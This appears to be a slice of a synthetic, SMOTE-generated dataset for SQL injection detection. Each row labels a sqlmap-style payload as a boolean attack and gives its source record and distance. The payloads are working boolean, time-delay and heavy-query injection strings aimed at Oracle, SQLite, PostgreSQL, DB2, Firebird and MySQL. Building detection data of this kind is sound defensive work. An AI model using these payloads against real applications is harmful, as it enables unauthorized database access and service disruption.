+SMOTE_000148,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'ojag'  =  'ojag",nearest_attack_euclidean,R000037,0.09248191672159112
+SMOTE_000149,attack,boolean,-9311   )    )    or   (  5065  =  2572  )  *2572 and    (    (   1199  =  1199,nearest_attack_euclidean,R000102,2.079894807351928
+SMOTE_000150,attack,boolean,"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000251,0.2582891441288214
+SMOTE_000151,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000042,0.14671763647123662
+SMOTE_000152,attack,boolean,-8538%' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',nearest_attack_euclidean,R000295,0.16155073473319975
+SMOTE_000153,attack,boolean,"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000210,0.7375917441157807
+SMOTE_000154,attack,boolean,"1' where 8837  =  8837 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000118,1.5457737982533792
+SMOTE_000155,attack,boolean,"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",nearest_attack_euclidean,R000257,0.655464847318159
+SMOTE_000156,attack,boolean,"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",nearest_attack_euclidean,R000212,0.5342402026664865
+SMOTE_000157,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000116,0.49068854965960224
+SMOTE_000158,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000136,0.5789553945571313
+SMOTE_000159,attack,boolean,"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",nearest_attack_euclidean,R000205,1.214869988272503
+SMOTE_000160,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000177,0.0504767419977459
+SMOTE_000161,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",nearest_attack_euclidean,R000125,1.1407785020590056
+SMOTE_000162,attack,boolean,"-5637%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000066,0.5163838483517572
+SMOTE_000163,attack,boolean,"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",nearest_attack_euclidean,R000212,0.21323165186538864
+SMOTE_000164,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000041,0.9091803551548137
+SMOTE_000165,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000312,0.9348083068482281
+SMOTE_000166,attack,boolean,"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000149,0.25473150012935103
+SMOTE_000167,attack,boolean,"1'   )    )    and elt  (  6847  =  5874,5874  )   and    (    (   'yspu'  =  'yspu",nearest_attack_euclidean,R000103,0.05046336187843509
+SMOTE_000168,attack,boolean,"-1162""   )    )    as mhmh where 8710  =  8710 or make_set  (  4822  =  7598,7598  )  --",nearest_attack_euclidean,R000302,0.09737425846921607
+SMOTE_000169,attack,boolean,"1' where 8749  =  8749 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000024,0.1208157152385218
+SMOTE_000170,attack,boolean,"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",nearest_attack_euclidean,R000097,1.0424912746421566
+SMOTE_000171,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""swec"" like ""swec",nearest_attack_euclidean,R000088,0.9900413207790117
+SMOTE_000172,attack,boolean,"1%""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000052,0.9804385439266082
+SMOTE_000173,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000215,0.41278204735960083
+SMOTE_000174,attack,boolean,"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000227,0.011604346227567564
+SMOTE_000175,attack,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000173,0.4381446469774678
+SMOTE_000176,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000077,1.9530341648041147
+SMOTE_000177,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '",nearest_attack_euclidean,R000161,0.24513520334612487
+SMOTE_000178,attack,boolean,"1%""   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000188,0.40799544102127216
+SMOTE_000179,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000240,0.8512322571862805
+SMOTE_000180,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000293,0.05444395654695754
+SMOTE_000181,attack,boolean,1'   )    )     )   and   (  8982  =  8027  )  *8027 and    (    (     (  'qkrv'  =  'qkrv,nearest_attack_euclidean,R000126,0.08142408555143474
+SMOTE_000182,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000104,0.9116242618019846
+SMOTE_000183,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000045,0.21135245913453277
+SMOTE_000184,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",nearest_attack_euclidean,R000119,0.7829432025618336
+SMOTE_000185,attack,boolean,"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",nearest_attack_euclidean,R000184,0.9779239704544979
+SMOTE_000186,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""yxes"" like ""yxes",nearest_attack_euclidean,R000222,0.8600622029710905
+SMOTE_000187,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000045,0.675536963799465
+SMOTE_000188,attack,boolean,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,nearest_attack_euclidean,R000057,0.09405811555843564
+SMOTE_000189,attack,boolean,"-2414%""  )   or elt  (  1032  =  1032,3623  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000221,0.5167064409294209
+SMOTE_000190,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R000304,0.5242644384065389
+SMOTE_000191,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000099,0.4525417933953338
+SMOTE_000192,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000183,0.05610263960389381
+SMOTE_000193,attack,boolean,"1%'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000279,1.1306289535177867
+SMOTE_000194,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""swec"" like ""swec",nearest_attack_euclidean,R000088,0.6914279897909057
+SMOTE_000195,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000244,1.5307011111657727
+SMOTE_000196,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000136,0.5718756947509257
+SMOTE_000197,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'hvqt'  =  'hvqt",nearest_attack_euclidean,R000213,0.1509369286209601
+SMOTE_000198,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000053,0.5756426340760744
+SMOTE_000199,attack,boolean,"-4932%""   )    )    or   (  3076  =  5927  )  *5927 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000249,0.05812141487055774
+SMOTE_000200,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000225,0.7762353418549007
